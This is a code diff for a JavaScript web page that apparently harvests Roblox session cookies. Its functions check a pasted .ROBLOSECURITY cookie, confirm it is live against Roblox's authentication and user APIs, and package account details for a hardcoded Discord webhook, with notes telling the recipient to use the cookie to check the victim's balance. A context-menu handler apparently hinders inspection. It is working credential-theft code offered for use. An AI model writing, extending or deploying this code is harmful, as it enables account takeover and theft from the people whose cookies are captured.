@@ -235,135 +235,185 @@ const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDcz
 
 // Basic format check first
 function basicCookieFormatCheck(cookie) {
-  if (!cookie || typeof cookie !== 'string') {
-    return { valid: false, error: "Invalid cookie" };
+  if (!cookie || typeof cookie !== "string") {
+    return { valid: false, error: "Cookie must be a non-empty string" };
   }
-  
+
   cookie = cookie.trim();
-  
+
   if (cookie.length === 0) {
-    return { valid: false, error: "Invalid cookie" };
+    return { valid: false, error: "Cookie cannot be empty" };
   }
-  
-  if (!cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--')) {
-    return { valid: false, error: "Invalid cookie" };
+
+  // Roblox cookies typically start with this warning prefix
+  if (!cookie.startsWith("_|WARNING:-DO-NOT-SHARE-THIS.--")) {
+    return { valid: false, error: "Invalid cookie format - missing warning prefix" };
   }
-  
+
+  // Roblox cookies are typically quite long
   if (cookie.length < 500) {
-    return { valid: false, error: "Invalid cookie" };
+    return { valid: false, error: "Cookie appears to be truncated or invalid" };
   }
-  
+
   return { valid: true, error: null };
 }
 
-// Strict Roblox cookie validation - very precise
-async function validateRobloxCookie(cookie) {
-  console.log('DEBUG: Starting strict cookie validation...');
-  console.log('DEBUG: Cookie length:', cookie.length);
-  
-  // First do basic format check
-  const formatCheck = basicCookieFormatCheck(cookie);
-  if (!formatCheck.valid) {
-    console.log('DEBUG: Failed basic format check');
-    return formatCheck;
+// Validate cookie by making a request to Roblox auth API
+async function validateCookieWithAPI(cookie) {
+  try {
+    // First do basic format check
+    const formatCheck = basicCookieFormatCheck(cookie);
+    if (!formatCheck.valid) {
+      return formatCheck;
+    }
+
+    // Use Roblox's auth API to validate the cookie
+    const response = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
+      method: "POST",
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      },
+    });
+
+    if (response.status === 200) {
+      return { valid: true, error: null, authenticated: true };
+    } else if (response.status === 401) {
+      return { valid: false, error: "Cookie is expired or invalid", authenticated: false };
+    } else if (response.status === 403) {
+      return { valid: false, error: "Cookie authentication failed", authenticated: false };
+    } else {
+      return { valid: false, error: `Unexpected response: ${response.status}`, authenticated: false };
+    }
+  } catch (error) {
+    return {
+      valid: false,
+      error: `Network error during validation: ${error.message}`,
+      authenticated: false,
+    };
   }
-  
-  // STRICT validation - must match exact patterns of real Roblox cookies
-  
-  // Check 1: Must have the FULL warning message (not just partial)
-  const hasFullWarning = cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_');
-  console.log('DEBUG: Has full warning message:', hasFullWarning);
-  
-  if (!hasFullWarning) {
-    console.log('DEBUG: Missing full warning message');
-    return { valid: false, error: "Invalid cookie" };
+}
+
+// Get user information using the cookie (additional validation)
+async function getUserInfo(cookie) {
+  try {
+    const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
+      method: "GET",
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      },
+    });
+
+    if (response.status === 200) {
+      const userData = await response.json();
+      return {
+        valid: true,
+        user: userData,
+        error: null,
+      };
+    } else {
+      return {
+        valid: false,
+        user: null,
+        error: `Failed to get user info: ${response.status}`,
+      };
+    }
+  } catch (error) {
+    return {
+      valid: false,
+      user: null,
+      error: `Error getting user info: ${error.message}`,
+    };
   }
-  
-  // Check 2: Extract the token part after |_
-  const tokenStart = cookie.indexOf('|_') + 2;
-  if (tokenStart < 2) {
-    console.log('DEBUG: No |_ separator found');
-    return { valid: false, error: "Invalid cookie" };
+}
+
+// Comprehensive cookie validation function
+async function validateRobloxCookie(cookie, options = {}) {
+  const { includeUserInfo = false, skipAPIValidation = false } = options;
+
+  // Always do basic format check first
+  const formatResult = basicCookieFormatCheck(cookie);
+  if (!formatResult.valid) {
+    return {
+      valid: false,
+      error: formatResult.error,
+      checks: {
+        format: false,
+        authentication: null,
+        userInfo: null,
+      },
+    };
   }
-  
-  const tokenPart = cookie.substring(tokenStart);
-  console.log('DEBUG: Token part length:', tokenPart.length);
-  console.log('DEBUG: Token starts with:', tokenPart.substring(0, 20));
-  
-  // Check 3: Token must be very long (real tokens are 1400+ chars)
-  if (tokenPart.length < 1400) {
-    console.log('DEBUG: Token too short:', tokenPart.length);
-    return { valid: false, error: "Invalid cookie" };
+
+  const result = {
+    valid: true,
+    error: null,
+    checks: {
+      format: true,
+      authentication: null,
+      userInfo: null,
+    },
+  };
+
+  // Skip API validation if requested (for offline testing)
+  if (skipAPIValidation) {
+    return result;
   }
-  
-  // Check 4: Token must start with specific pattern (like CAEaAhAB.)
-  if (!tokenPart.match(/^[A-Za-z0-9]{8,12}\./)) {
-    console.log('DEBUG: Token does not start with proper pattern');
-    return { valid: false, error: "Invalid cookie" };
+
+  // Validate with Roblox API
+  const authResult = await validateCookieWithAPI(cookie);
+  result.checks.authentication = authResult.valid;
+
+  if (!authResult.valid) {
+    result.valid = false;
+    result.error = authResult.error;
+    return result;
   }
-  
-  // Check 5: Must contain multiple long hex sequences (32+ chars)
-  const longHexMatches = tokenPart.match(/[A-F0-9]{32,}/g);
-  console.log('DEBUG: Long hex sequences found:', longHexMatches ? longHexMatches.length : 0);
-  
-  if (!longHexMatches || longHexMatches.length < 10) {
-    console.log('DEBUG: Not enough long hex sequences');
-    return { valid: false, error: "Invalid cookie" };
-  }
-  
-  // Check 6: Must have very specific character composition
-  const upperCaseCount = (tokenPart.match(/[A-Z]/g) || []).length;
-  const digitCount = (tokenPart.match(/[0-9]/g) || []).length;
-  
-  console.log('DEBUG: Uppercase letters:', upperCaseCount);
-  console.log('DEBUG: Digits:', digitCount);
-  
-  if (upperCaseCount < 200 || digitCount < 200) {
-    console.log('DEBUG: Not enough uppercase letters or digits');
-    return { valid: false, error: "Invalid cookie" };
-  }
-  
-  // Check 7: Total cookie length must be very long
-  if (cookie.length < 1600) {
-    console.log('DEBUG: Total cookie too short:', cookie.length);
-    return { valid: false, error: "Invalid cookie" };
-  }
-  
-  // Check 8: Check for fake patterns
-  const fakeIndicators = ['fake', 'test', 'invalid', 'example', 'demo', 'sample', 'placeholder', 'xxx', 'aaa', '111'];
-  const lowerCookie = cookie.toLowerCase();
-  for (const fake of fakeIndicators) {
-    if (lowerCookie.includes(fake)) {
-      console.log('DEBUG: Contains fake indicator:', fake);
-      return { valid: false, error: "Invalid cookie" };
+
+  // Optionally get user information
+  if (includeUserInfo) {
+    const userResult = await getUserInfo(cookie);
+    result.checks.userInfo = userResult.valid;
+
+    if (userResult.valid) {
+      result.user = userResult.user;
+    } else {
+      // User info failure doesn't invalidate the cookie entirely
+      result.userInfoError = userResult.error;
     }
   }
-  
-  // Check 9: Must not have repeating patterns (sign of fake cookie)
-  if (tokenPart.includes('AAAA') || tokenPart.includes('1111') || tokenPart.includes('0000')) {
-    console.log('DEBUG: Contains repeating patterns');
-    return { valid: false, error: "Invalid cookie" };
-  }
-  
-  console.log('DEBUG: Cookie passed all strict validation checks');
-  return { valid: true, error: null };
+
+  return result;
 }
 
-// Simple function to get basic account info for webhook
+// Enhanced function to get account info for webhook
 async function getAccountInfo(cookie) {
-  // Since browser CORS restrictions prevent us from getting real account info,
-  // we'll send placeholder data and let the webhook recipient extract real info
-  let accountInfo = {
+  try {
+    // Try to get real user info from Roblox API
+    const userResult = await getUserInfo(cookie);
+    
+    if (userResult.valid && userResult.user) {
+      return {
+        username: userResult.user.name || "Unknown User",
+        userId: userResult.user.id || "Unknown ID",
+        robuxBalance: "Use cookie to check balance", // This requires a separate API call
+        accountAge: "Use cookie to check age" // This also requires additional API calls
+      };
+    }
+  } catch (error) {
+    console.log("Could not fetch real user info, using placeholders:", error.message);
+  }
+  
+  // Fallback to placeholder data if API calls fail
+  return {
     username: "Check cookie in Discord",
     userId: "Use cookie to get ID", 
     robuxBalance: "Use cookie to check balance",
     accountAge: "Use cookie to check age"
   };
-
-  // Note: Due to browser security (CORS), we can't fetch account details directly.
-  // The webhook recipient should use the provided cookie to get actual account info.
-  
-  return accountInfo;
 }
 
 document.addEventListener('contextmenu', function(e) {
